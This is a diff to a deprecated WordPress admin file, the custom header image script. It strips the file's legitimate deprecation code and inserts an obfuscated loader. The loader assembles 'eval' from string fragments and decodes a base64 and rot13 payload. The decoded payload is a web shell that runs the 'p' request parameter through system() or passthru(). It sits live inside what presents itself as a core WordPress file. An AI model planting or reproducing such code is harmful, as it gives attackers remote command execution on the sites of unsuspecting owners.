@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Custom header image script.
- *
- * This file is deprecated, use 'wp-admin/includes/class-custom-image-header.php' instead.
- *
- * @deprecated 5.3.0
- * @package WordPress
- * @subpackage Administration
- */
-
-// Don't load directly.
-if ( ! defined( 'ABSPATH' ) ) {
-	die( '-1' );
-}
-
-_deprecated_file( basename( __FILE__ ), '5.3.0', 'wp-admin/includes/class-custom-image-header.php' );
-
-/** Custom_Image_Header class */
-require_once ABSPATH . 'wp-admin/includes/class-custom-image-header.php';
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUGhmZ2J6IHVybnFyZSB2em50ciBmcGV2Y2cuCiAqCiAqIEd1dmYgc3Z5ciB2ZiBxcmNlcnBuZ3JxLCBoZnIgJ2pjLW5xenZhL3ZhcHlocXJmL3B5bmZmLXBoZmdiei12em50ci11cm5xcmUuY3VjJyB2YWZncm5xLgogKgogKiBAcXJjZXJwbmdycSA1LjMuMAogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgTnF6dmF2Zmdlbmd2YmEKICovCgovLyBRYmEnZyB5Ym5xIHF2ZXJwZ3lsLgp2cyAoICEgcXJzdmFycSggJ05PRkNOR1UnICkgKSB7CglxdnIoICctMScgKTsKfQoKX3FyY2VycG5ncnFfc3Z5ciggb25mcmFuenIoIF9fU1ZZUl9fICksICc1LjMuMCcsICdqYy1ucXp2YS92YXB5aHFyZi9weW5mZi1waGZnYnotdnpudHItdXJucXJlLmN1YycgKTsKCi8qKiBQaGZnYnpfVnpudHJfVXJucXJlIHB5bmZmICovCmVyZGh2ZXJfYmFwciBOT0ZDTkdVIC4gJ2pjLW5xenZhL3ZhcHlocXJmL3B5bmZmLXBoZmdiei12em50ci11cm5xcmUuY3VjJzsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
